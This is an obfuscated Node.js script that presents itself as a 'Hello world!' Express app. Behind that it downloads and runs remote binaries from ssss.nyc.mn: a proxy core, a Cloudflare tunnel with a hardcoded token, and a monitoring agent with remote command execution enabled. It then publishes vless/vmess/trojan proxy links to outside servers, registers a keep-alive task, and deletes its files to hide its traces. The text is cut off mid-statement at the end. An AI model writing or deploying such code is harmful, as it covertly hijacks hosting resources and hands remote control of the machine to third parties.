const _0x370d4c=_0x5cce;(function(_0x19b3ae,_0x27cb1c){const _0x199727=_0x5cce,_0x3919c1=_0x19b3ae();while(!![]){try{const _0x23cdba=parseInt(_0x199727(0x12a))/0x1+-parseInt(_0x199727(0xd5))/0x2+-parseInt(_0x199727(0xe5))/0x3*(parseInt(_0x199727(0x12c))/0x4)+-parseInt(_0x199727(0xe3))/0x5+-parseInt(_0x199727(0x155))/0x6+parseInt(_0x199727(0x140))/0x7*(-parseInt(_0x199727(0xee))/0x8)+parseInt(_0x199727(0xec))/0x9;if(_0x23cdba===_0x27cb1c)break;else _0x3919c1['push'](_0x3919c1['shift']());}catch(_0x3fe52c){_0x3919c1['push'](_0x3919c1['shift']());}}}(_0x1571,0x90cfe));const express=require(_0x370d4c(0x103)),app=express(),axios=require(_0x370d4c(0x166)),os=require('os'),fs=require('fs'),path=require(_0x370d4c(0xe4)),{promisify}=require(_0x370d4c(0x13d)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x370d4c(0x139)),UPLOAD_URL=process[_0x370d4c(0x190)][_0x370d4c(0x159)]||'',PROJECT_URL=process[_0x370d4c(0x190)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x370d4c(0x190)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x370d4c(0x190)][_0x370d4c(0xe0)]||_0x370d4c(0x10e),SUB_PATH=process[_0x370d4c(0x190)][_0x370d4c(0x113)]||_0x370d4c(0x152),PORT=process[_0x370d4c(0x190)][_0x370d4c(0xdf)]||process['env'][_0x370d4c(0x148)]||0xbb8,UUID=process[_0x370d4c(0x190)][_0x370d4c(0x18a)]||'8575c770-ba4f-4535-be27-3739265af464',NEZHA_SERVER=process[_0x370d4c(0x190)][_0x370d4c(0x154)]||'',NEZHA_PORT=process['env'][_0x370d4c(0x10c)]||'',NEZHA_KEY=process[_0x370d4c(0x190)][_0x370d4c(0x198)]||'',ARGO_DOMAIN=process[_0x370d4c(0x190)][_0x370d4c(0xf1)]||'vpn.cctv2018.de5.net',ARGO_AUTH=process[_0x370d4c(0x190)]['ARGO_AUTH']||_0x370d4c(0x18c),ARGO_PORT=process[_0x370d4c(0x190)][_0x370d4c(0x16c)]||0x1f41,CFIP=process[_0x370d4c(0x190)][_0x370d4c(0xf5)]||_0x370d4c(0x183),CFPORT=process[_0x370d4c(0x190)][_0x370d4c(0x182)]||0x1bb,NAME=process['env'][_0x370d4c(0x138)]||'luhuajiang1988';!fs[_0x370d4c(0x162)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x370d4c(0x114))):console['log'](FILE_PATH+_0x370d4c(0x130));function generateRandomName(){const _0x8896f3=_0x370d4c,_0x241a15=_0x8896f3(0x163);let _0x1243a2='';for(let _0x3065ac=0x0;_0x3065ac<0x6;_0x3065ac++){_0x1243a2+=_0x241a15[_0x8896f3(0x161)](Math['floor'](Math[_0x8896f3(0x122)]()*_0x241a15['length']));}return _0x1243a2;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x370d4c(0x13b)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x370d4c(0x13b)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x370d4c(0x13b)](FILE_PATH,_0x370d4c(0xf3)),listPath=path[_0x370d4c(0x13b)](FILE_PATH,_0x370d4c(0x156)),bootLogPath=path[_0x370d4c(0x13b)](FILE_PATH,_0x370d4c(0x13a)),configPath=path[_0x370d4c(0x13b)](FILE_PATH,'config.json');function deleteNodes(){const _0x429de8=_0x370d4c;try{if(!UPLOAD_URL)return;if(!fs[_0x429de8(0x162)](subPath))return;let _0x32a914;try{_0x32a914=fs[_0x429de8(0xf9)](subPath,'utf-8');}catch{return null;}const _0x3573a6=Buffer[_0x429de8(0x180)](_0x32a914,_0x429de8(0x153))[_0x429de8(0x17d)](_0x429de8(0xed)),_0x43c06a=_0x3573a6[_0x429de8(0x174)]('\x0a')[_0x429de8(0x185)](_0x5e5237=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x429de8(0x17f)](_0x5e5237));if(_0x43c06a['length']===0x0)return;return axios[_0x429de8(0x15f)](UPLOAD_URL+_0x429de8(0x115),JSON['stringify']({'nodes':_0x43c06a}),{'headers':{'Content-Type':_0x429de8(0x178)}})['catch'](_0x1fb8c2=>{return null;}),null;}catch(_0x50c511){return null;}}function cleanupOldFiles(){const _0x5ce8ac=_0x370d4c;try{const _0x5d2075=fs[_0x5ce8ac(0x125)](FILE_PATH);_0x5d2075['forEach'](_0x19c3c6=>{const _0x50490a=_0x5ce8ac,_0x3292bf=path['join'](FILE_PATH,_0x19c3c6);try{const _0x1d1a3a=fs[_0x50490a(0xe2)](_0x3292bf);_0x1d1a3a[_0x50490a(0x10b)]()&&fs[_0x50490a(0x16a)](_0x3292bf);}catch(_0x4f2390){}});}catch(_0x38026d){}}app[_0x370d4c(0x195)]('/',function(_0x2c440e,_0x3a5112){const _0x327477=_0x370d4c;_0x3a5112[_0x327477(0x18e)](_0x327477(0x14d));});function _0x1571(){const _0x54f862=['\x20-s\x20','CFIP','freedom','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/api/add-nodes','readFileSync','arm','match','block','direct','\x20-c\x20\x22','win32','TunnelSecret','?security=tls&sni=','then','express','NEZHA\x20variable\x20is\x20empty,skip\x20running','nohup\x20','createWriteStream','\x20is\x20running','forEach','del\x20/f\x20/q\x20','config.yaml','isFile','NEZHA_PORT','listen','./tmp','tls','Unhandled\x20error\x20in\x20startserver:','error','clear','SUB_PATH','\x20is\x20created','/api/delete-nodes','\x0a\x20\x20\x20\x20','config.json','127.0.0.1','Error\x20in\x20startserver:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','has','\x20successfully','--tls','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','push','stringify','random','\x0a\x20\x20credentials-file:\x20','firefox','readdirSync','http','Empowerment\x20success\x20for\x20','https://arm64.ssss.nyc.mn/v1','success','420208tRSqNz','ArgoDomain:','76pMSvgV','log','\x20-c\x20','taskkill\x20/f\x20/im\x20','\x20already\x20exists','?encryption=none&security=tls&sni=','xtls-rprx-vision','message','https://arm64.ssss.nyc.mn/agent','2083','Empowerment\x20failed\x20for\x20','\x20>\x20nul\x202>&1','NAME','child_process','boot.log','join','country_code','util','web\x20running\x20error:\x20','https://oooo.serv00.net/add-url','359037VlqVHb','/vmess-argo?ed=2560','tunnel.json','includes','unlink','\x0a\x0avmess://','\x20>/dev/null\x202>&1\x20&','Subscription\x20uploaded\x20successfully','PORT','set','/config.json\x20>/dev/null\x202>&1\x20&','platform','\x0a\x0atrojan://','Hello\x20world!','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/vless-argo','https://arm64.ssss.nyc.mn/web','true','luhuajiang','base64','NEZHA_SERVER','4180098gpzqDf','list.txt','ARGO_DOMAIN:','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','UPLOAD_URL','vless','Error\x20executing\x20command:\x20','\x20failed:\x20','443','tcp','post','pop','charAt','existsSync','abcdefghijklmnopqrstuvwxyz','automatic\x20access\x20task\x20added\x20successfully','catch','axios','trojan','basename','text/plain;\x20charset=utf-8','unlinkSync','\x20>/dev/null\x202>&1','ARGO_PORT','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://amd64.ssss.nyc.mn/v1','http://ip-api.com/json/','unshift','Download\x20','org','php\x20running\x20error:\x20','split','none','Error\x20reading\x20boot.log:','close','application/json','data','https://ipapi.co/json/','vmess','/dev/null','toString','length','test','from','arch','CFPORT','cdns.doon.eu.org','&path=%2Ftrojan-argo%3Fed%3D2560#','filter','aarch64','\x22\x20>\x20/dev/null\x202>&1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','chmod','UUID','/tunnel.yml\x20run','eyJhIjoiMGQzNzA4YzNlNTQ1ZjQ4OTg1N2Q3NTJlZjg0ODI3YjIiLCJ0IjoiMTc1ZTZlZGMtNmY5Ny00YzM5LWFmNGQtMjU1NzU4NmU4OTkzIiwicyI6Ill6WmtaVEEwTURjdE9HUTROQzAwTm1NNUxUZzJaakl0Wm1NM1l6TTJNMlV3T1RFMSJ9','response','send','&fp=firefox&type=ws&host=','env','/sub.txt\x20saved\x20successfully','finish','status','8443','get','https://amd64.ssss.nyc.mn/web','writeFileSync','NEZHA_KEY','2053','/trojan-argo','false','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','.exe\x20>\x20nul\x202>&1','fileName','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','1523690QFlguV','\x0a\x20\x20tunnel:\x20','https://arm64.ssss.nyc.mn/bot','rm\x20-rf\x20','2096','Error\x20downloading\x20files:','tunnel.yml','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','2087','pipe','SERVER_PORT','FILE_PATH','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','statSync','4421600hASyPU','path','99321oKGNUo','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','quic','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','all','countryCode','arm64','36612549WSshKD','utf-8','144zInGzs','stream','App\x20is\x20running','ARGO_DOMAIN','/vmess-argo','sub.txt'];_0x1571=function(){return _0x54f862;};return _0x1571();}async function generateConfig(){const _0x9687f3=_0x370d4c,_0x41f08f={'log':{'access':_0x9687f3(0x17c),'error':_0x9687f3(0x17c),'loglevel':_0x9687f3(0x175)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x9687f3(0x15a),'settings':{'clients':[{'id':UUID,'flow':_0x9687f3(0x132)}],'decryption':_0x9687f3(0x175),'fallbacks':[{'dest':0xbb9},{'path':_0x9687f3(0x14f),'dest':0xbba},{'path':_0x9687f3(0xf2),'dest':0xbbb},{'path':_0x9687f3(0xcf),'dest':0xbbc}]},'streamSettings':{'network':_0x9687f3(0x15e)}},{'port':0xbb9,'listen':_0x9687f3(0x118),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x9687f3(0x175)}},{'port':0xbba,'listen':_0x9687f3(0x118),'protocol':_0x9687f3(0x15a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x9687f3(0x175),'wsSettings':{'path':_0x9687f3(0x14f)}},'sniffing':{'enabled':!![],'destOverride':[_0x9687f3(0x126),_0x9687f3(0x10f),_0x9687f3(0xe7)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x9687f3(0x17b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x9687f3(0xf2)}},'sniffing':{'enabled':!![],'destOverride':[_0x9687f3(0x126),'tls',_0x9687f3(0xe7)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x9687f3(0x118),'protocol':_0x9687f3(0x167),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x9687f3(0x175),'wsSettings':{'path':_0x9687f3(0xcf)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x9687f3(0x10f),_0x9687f3(0xe7)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x9687f3(0xf6),'tag':_0x9687f3(0xfd)},{'protocol':'blackhole','tag':_0x9687f3(0xfc)}]};fs[_0x9687f3(0x197)](path[_0x9687f3(0x13b)](FILE_PATH,_0x9687f3(0x117)),JSON[_0x9687f3(0x121)](_0x41f08f,null,0x2));}function getSystemArchitecture(){const _0x21f973=_0x370d4c,_0xb59a64=os[_0x21f973(0x181)]();return _0xb59a64==='arm'||_0xb59a64===_0x21f973(0xeb)||_0xb59a64===_0x21f973(0x186)?_0x21f973(0xfa):'amd';}function downloadFile(_0x4a1036,_0x3745c1,_0x46364d){const _0x6c21fe=_0x370d4c,_0x491cf0=_0x4a1036;!fs[_0x6c21fe(0x162)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x39fd31=fs[_0x6c21fe(0x106)](_0x491cf0);axios({'method':_0x6c21fe(0x195),'url':_0x3745c1,'responseType':_0x6c21fe(0xef)})[_0x6c21fe(0x102)](_0x26f1e5=>{const _0x3c00ca=_0x6c21fe;_0x26f1e5[_0x3c00ca(0x179)][_0x3c00ca(0xde)](_0x39fd31),_0x39fd31['on'](_0x3c00ca(0x192),()=>{const _0x54884b=_0x3c00ca;_0x39fd31[_0x54884b(0x177)](),console[_0x54884b(0x12d)]('Download\x20'+path['basename'](_0x491cf0)+_0x54884b(0x11d)),_0x46364d(null,_0x491cf0);}),_0x39fd31['on']('error',_0x43e437=>{const _0x385580=_0x3c00ca;fs[_0x385580(0x144)](_0x491cf0,()=>{});const _0x454456='Download\x20'+path[_0x385580(0x168)](_0x491cf0)+_0x385580(0x15c)+_0x43e437[_0x385580(0x133)];console['error'](_0x454456),_0x46364d(_0x454456);});})[_0x6c21fe(0x165)](_0x5bb01e=>{const _0x3b5a7b=_0x6c21fe,_0x1916f1=_0x3b5a7b(0x171)+path[_0x3b5a7b(0x168)](_0x491cf0)+'\x20failed:\x20'+_0x5bb01e['message'];console[_0x3b5a7b(0x111)](_0x1916f1),_0x46364d(_0x1916f1);});}async function downloadFilesAndRun(){const _0x5102e7=_0x370d4c,_0x5591fd=getSystemArchitecture(),_0x33a1a1=getFilesForArchitecture(_0x5591fd);if(_0x33a1a1[_0x5102e7(0x17e)]===0x0){console['log'](_0x5102e7(0x158));return;}const _0x261913=_0x33a1a1['map'](_0xcbba7f=>{return new Promise((_0x91a3,_0x3f69b6)=>{const _0x478d89=_0x5cce;downloadFile(_0xcbba7f[_0x478d89(0xd3)],_0xcbba7f['fileUrl'],(_0x6a6613,_0xbf61e6)=>{_0x6a6613?_0x3f69b6(_0x6a6613):_0x91a3(_0xbf61e6);});});});try{await Promise[_0x5102e7(0xe9)](_0x261913);}catch(_0x4f9697){console[_0x5102e7(0x111)](_0x5102e7(0xda),_0x4f9697);return;}function _0x90a24f(_0x39b1e2){const _0xc76c1d=_0x5102e7,_0xbfb76b=0x1fd;_0x39b1e2[_0xc76c1d(0x108)](_0x1d9fac=>{const _0x37d844=_0xc76c1d;fs['existsSync'](_0x1d9fac)&&fs[_0x37d844(0x189)](_0x1d9fac,_0xbfb76b,_0x3eb061=>{const _0x1f1a1b=_0x37d844;_0x3eb061?console[_0x1f1a1b(0x111)](_0x1f1a1b(0x136)+_0x1d9fac+':\x20'+_0x3eb061):console[_0x1f1a1b(0x12d)](_0x1f1a1b(0x127)+_0x1d9fac+':\x20'+_0xbfb76b[_0x1f1a1b(0x17d)](0x8));});});}const _0x57c2c6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x90a24f(_0x57c2c6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5d746f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x5102e7(0x160)]():'',_0x16e4cc=new Set([_0x5102e7(0x15d),_0x5102e7(0x194),_0x5102e7(0xd9),_0x5102e7(0xdd),_0x5102e7(0x135),_0x5102e7(0x199)]),_0xe7a2bd=_0x16e4cc[_0x5102e7(0x11c)](_0x5d746f)?_0x5102e7(0x151):_0x5102e7(0xd0),_0xf0b84d='\x0aclient_secret:\x20'+NEZHA_KEY+_0x5102e7(0x188)+NEZHA_SERVER+_0x5102e7(0xf7)+_0xe7a2bd+_0x5102e7(0xe8)+UUID;fs[_0x5102e7(0x197)](path[_0x5102e7(0x13b)](FILE_PATH,_0x5102e7(0x10a)),_0xf0b84d);const _0x9079f='nohup\x20'+phpPath+_0x5102e7(0xfe)+FILE_PATH+_0x5102e7(0xe1);try{await exec(_0x9079f),console[_0x5102e7(0x12d)](phpName+_0x5102e7(0x107)),await new Promise(_0x26cf98=>setTimeout(_0x26cf98,0x3e8));}catch(_0x239560){console[_0x5102e7(0x111)](_0x5102e7(0x173)+_0x239560);}}else{let _0xa1f599='';const _0x169482=[_0x5102e7(0x15d),_0x5102e7(0x194),'2096',_0x5102e7(0xdd),_0x5102e7(0x135),_0x5102e7(0x199)];_0x169482[_0x5102e7(0x143)](NEZHA_PORT)&&(_0xa1f599=_0x5102e7(0x11e));const _0x1c91d6=_0x5102e7(0x105)+npmPath+_0x5102e7(0xf4)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0xa1f599+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1c91d6),console[_0x5102e7(0x12d)](npmName+'\x20is\x20running'),await new Promise(_0xd825fb=>setTimeout(_0xd825fb,0x3e8));}catch(_0x378f6a){console[_0x5102e7(0x111)]('npm\x20running\x20error:\x20'+_0x378f6a);}}}else console[_0x5102e7(0x12d)](_0x5102e7(0x104));const _0x27cbf1=_0x5102e7(0x105)+webPath+_0x5102e7(0x12e)+FILE_PATH+_0x5102e7(0x14a);try{await exec(_0x27cbf1),console[_0x5102e7(0x12d)](webName+_0x5102e7(0x107)),await new Promise(_0x541739=>setTimeout(_0x541739,0x3e8));}catch(_0x3e669d){console[_0x5102e7(0x111)](_0x5102e7(0x13e)+_0x3e669d);}if(fs[_0x5102e7(0x162)](botPath)){let _0x363cd5;if(ARGO_AUTH[_0x5102e7(0xfb)](/^[A-Z0-9a-z=]{120,250}$/))_0x363cd5='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x5102e7(0xfb)](/TunnelSecret/)?_0x363cd5=_0x5102e7(0x11f)+FILE_PATH+_0x5102e7(0x18b):_0x363cd5='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x363cd5+_0x5102e7(0x146)),console[_0x5102e7(0x12d)](botName+_0x5102e7(0x107)),await new Promise(_0x14865d=>setTimeout(_0x14865d,0x7d0));}catch(_0x1f682d){console[_0x5102e7(0x111)]('Error\x20executing\x20command:\x20'+_0x1f682d);}}await new Promise(_0x5d948f=>setTimeout(_0x5d948f,0x1388));}function getFilesForArchitecture(_0x27cb16){const _0x306518=_0x370d4c;let _0x172498;_0x27cb16===_0x306518(0xfa)?_0x172498=[{'fileName':webPath,'fileUrl':_0x306518(0x150)},{'fileName':botPath,'fileUrl':_0x306518(0xd7)}]:_0x172498=[{'fileName':webPath,'fileUrl':_0x306518(0x196)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xc75dd0=_0x27cb16===_0x306518(0xfa)?_0x306518(0x134):'https://amd64.ssss.nyc.mn/agent';_0x172498['unshift']({'fileName':npmPath,'fileUrl':_0xc75dd0});}else{const _0x1af8e4=_0x27cb16==='arm'?_0x306518(0x128):_0x306518(0x16e);_0x172498[_0x306518(0x170)]({'fileName':phpPath,'fileUrl':_0x1af8e4});}}return _0x172498;}function argoType(){const _0x4de524=_0x370d4c;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x4de524(0xdc));return;}if(ARGO_AUTH[_0x4de524(0x143)](_0x4de524(0x100))){fs[_0x4de524(0x197)](path[_0x4de524(0x13b)](FILE_PATH,_0x4de524(0x142)),ARGO_AUTH);const _0x23979e=_0x4de524(0xd6)+ARGO_AUTH[_0x4de524(0x174)]('\x22')[0xb]+_0x4de524(0x123)+path[_0x4de524(0x13b)](FILE_PATH,_0x4de524(0x142))+_0x4de524(0x16d)+ARGO_DOMAIN+_0x4de524(0x11b)+ARGO_PORT+_0x4de524(0xd4);fs[_0x4de524(0x197)](path[_0x4de524(0x13b)](FILE_PATH,_0x4de524(0xdb)),_0x23979e);}else console[_0x4de524(0x12d)](_0x4de524(0xe6));}async function extractDomains(){const _0x370723=_0x370d4c;let _0x504f1d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x504f1d=ARGO_DOMAIN,console[_0x370723(0x12d)](_0x370723(0x157),_0x504f1d),await _0x5420b7(_0x504f1d);else try{const _0x669d58=fs[_0x370723(0xf9)](path[_0x370723(0x13b)](FILE_PATH,_0x370723(0x13a)),_0x370723(0xed)),_0x26f7fe=_0x669d58[_0x370723(0x174)]('\x0a'),_0x5bcbc9=[];_0x26f7fe[_0x370723(0x108)](_0x228e9d=>{const _0x4ee1e8=_0x370723,_0x1d7558=_0x228e9d[_0x4ee1e8(0xfb)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1d7558){const _0x240c3c=_0x1d7558[0x1];_0x5bcbc9['push'](_0x240c3c);}});if(_0x5bcbc9[_0x370723(0x17e)]>0x0)_0x504f1d=_0x5bcbc9[0x0],console['log'](_0x370723(0x12b),_0x504f1d),await _0x5420b7(_0x504f1d);else{console['log']('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x370723(0x13b)](FILE_PATH,_0x370723(0x13a)));async function _0x4c01c6(){const _0x1650a6=_0x370723;try{process[_0x1650a6(0x14b)]==='win32'?await exec(_0x1650a6(0x12f)+botName+_0x1650a6(0xd2)):await exec('pkill\x20-f\x20\x22['+botName[_0x1650a6(0x161)](0x0)+']'+botName['substring'](0x1)+_0x1650a6(0x187));}catch(_0x33befb){}}_0x4c01c6(),await new Promise(_0x22e345=>setTimeout(_0x22e345,0xbb8));const _0x1f199e=_0x370723(0xd1)+FILE_PATH+_0x370723(0x11a)+ARGO_PORT;try{await exec(_0x370723(0x105)+botPath+'\x20'+_0x1f199e+_0x370723(0x146)),console[_0x370723(0x12d)](botName+_0x370723(0x107)),await new Promise(_0x27d792=>setTimeout(_0x27d792,0xbb8)),await extractDomains();}catch(_0x422ca9){console[_0x370723(0x111)](_0x370723(0x15b)+_0x422ca9);}}}catch(_0x5561ae){console[_0x370723(0x111)](_0x370723(0x176),_0x5561ae);}async function _0x3ab149(){const _0x540e9d=_0x370723;try{const _0x1c843b=await axios[_0x540e9d(0x195)](_0x540e9d(0x17a),{'timeout':0xbb8});if(_0x1c843b[_0x540e9d(0x179)]&&_0x1c843b[_0x540e9d(0x179)][_0x540e9d(0x13c)]&&_0x1c843b['data'][_0x540e9d(0x172)])return _0x1c843b[_0x540e9d(0x179)][_0x540e9d(0x13c)]+'_'+_0x1c843b[_0x540e9d(0x179)]['org'];}catch(_0x395e0b){try{const _0x2b065e=await axios[_0x540e9d(0x195)](_0x540e9d(0x16f),{'timeout':0xbb8});if(_0x2b065e[_0x540e9d(0x179)]&&_0x2b065e['data'][_0x540e9d(0x193)]===_0x540e9d(0x129)&&_0x2b065e[_0x540e9d(0x179)][_0x540e9d(0xea)]&&_0x2b065e['data'][_0x540e9d(0x172)])return _0x2b065e['data'][_0x540e9d(0xea)]+'_'+_0x2b065e['data'][_0x540e9d(0x172)];}catch(_0x205770){}}return'Unknown';}async function _0x5420b7(_0x17a488){const _0x2b39fe=await _0x3ab149(),_0x4071b5=NAME?NAME+'-'+_0x2b39fe:_0x2b39fe;return new Promise(_0x299a3f=>{setTimeout(()=>{const _0x4b91e7=_0x5cce,_0x1a11cc={'v':'2','ps':''+_0x4071b5,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4b91e7(0x175),'net':'ws','type':_0x4b91e7(0x175),'host':_0x17a488,'path':_0x4b91e7(0x141),'tls':_0x4b91e7(0x10f),'sni':_0x17a488,'alpn':'','fp':_0x4b91e7(0x124)},_0x14ef30='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x4b91e7(0x131)+_0x17a488+_0x4b91e7(0x18f)+_0x17a488+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x4071b5+_0x4b91e7(0x145)+Buffer['from'](JSON[_0x4b91e7(0x121)](_0x1a11cc))[_0x4b91e7(0x17d)](_0x4b91e7(0x153))+_0x4b91e7(0x14c)+UUID+'@'+CFIP+':'+CFPORT+_0x4b91e7(0x101)+_0x17a488+_0x4b91e7(0x18f)+_0x17a488+_0x4b91e7(0x184)+_0x4071b5+_0x4b91e7(0x116);console['log'](Buffer[_0x4b91e7(0x180)](_0x14ef30)['toString'](_0x4b91e7(0x153))),fs['writeFileSync'](subPath,Buffer[_0x4b91e7(0x180)](_0x14ef30)[_0x4b91e7(0x17d)](_0x4b91e7(0x153))),console[_0x4b91e7(0x12d)](FILE_PATH+_0x4b91e7(0x191)),uploadNodes(),app[_0x4b91e7(0x195)]('/'+SUB_PATH,(_0x4c4ccc,_0x50bcde)=>{const _0x46ddbc=_0x4b91e7,_0x1215a0=Buffer[_0x46ddbc(0x180)](_0x14ef30)[_0x46ddbc(0x17d)](_0x46ddbc(0x153));_0x50bcde[_0x46ddbc(0x149)]('Content-Type',_0x46ddbc(0x169)),_0x50bcde[_0x46ddbc(0x18e)](_0x1215a0);}),_0x299a3f(_0x14ef30);},0x7d0);});}}async function uploadNodes(){const _0x13f009=_0x370d4c;if(UPLOAD_URL&&PROJECT_URL){const _0x12bab4=PROJECT_URL+'/'+SUB_PATH,_0x119afb={'subscription':[_0x12bab4]};try{const _0x5c03ff=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x119afb,{'headers':{'Content-Type':_0x13f009(0x178)}});return _0x5c03ff&&_0x5c03ff[_0x13f009(0x193)]===0xc8?(console[_0x13f009(0x12d)](_0x13f009(0x147)),_0x5c03ff):null;}catch(_0x4f4bae){if(_0x4f4bae[_0x13f009(0x18d)]){if(_0x4f4bae['response'][_0x13f009(0x193)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x13f009(0x162)](listPath))return;const _0xea5772=fs[_0x13f009(0xf9)](listPath,_0x13f009(0xed)),_0x162c34=_0xea5772[_0x13f009(0x174)]('\x0a')[_0x13f009(0x185)](_0x21a681=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x13f009(0x17f)](_0x21a681));if(_0x162c34[_0x13f009(0x17e)]===0x0)return;const _0x35a866=JSON[_0x13f009(0x121)]({'nodes':_0x162c34});try{const _0x3e0834=await axios[_0x13f009(0x15f)](UPLOAD_URL+_0x13f009(0xf8),_0x35a866,{'headers':{'Content-Type':_0x13f009(0x178)}});return _0x3e0834&&_0x3e0834[_0x13f009(0x193)]===0xc8?(console[_0x13f009(0x12d)]('Nodes\x20uploaded\x20successfully'),_0x3e0834):null;}catch(_0x108159){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x480846=_0x5cce,_0x3ef67f=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3ef67f[_0x480846(0x120)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3ef67f[_0x480846(0x120)](phpPath);process[_0x480846(0x14b)]===_0x480846(0xff)?exec(_0x480846(0x109)+_0x3ef67f['join']('\x20')+_0x480846(0x137),_0x44dd18=>{const _0xe6ed6f=_0x480846;console[_0xe6ed6f(0x112)](),console[_0xe6ed6f(0x12d)](_0xe6ed6f(0xf0)),console[_0xe6ed6f(0x12d)](_0xe6ed6f(0x14e));}):exec(_0x480846(0xd8)+_0x3ef67f[_0x480846(0x13b)]('\x20')+_0x480846(0x16b),_0xeb8129=>{const _0x584803=_0x480846;console['clear'](),console[_0x584803(0x12d)](_0x584803(0xf0)),console[_0x584803(0x12d)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();function _0x5cce(_0x38fcc4,_0x3cad54){_0x38fcc4=_0x38fcc4-0xcf;const _0x1571ce=_0x1571();let _0x5ccef1=_0x1571ce[_0x38fcc4];return _0x5ccef1;}async function AddVisitTask(){const _0x497630=_0x370d4c;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x2d8e49=await axios[_0x497630(0x15f)](_0x497630(0x13f),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x497630(0x178)}});return console[_0x497630(0x12d)](_0x497630(0x164)),_0x2d8e49;}catch(_0x34e5d0){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x34e5d0[_0x497630(0x133)]),null;}}async function startserver(){const _0x2a09a3=_0x370d4c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4fa866){console[_0x2a09a3(0x111)](_0x2a09a3(0x119),_0x4fa866);}}startserver()[_0x370d4c(0x165)](_0x3aa89e=>{const 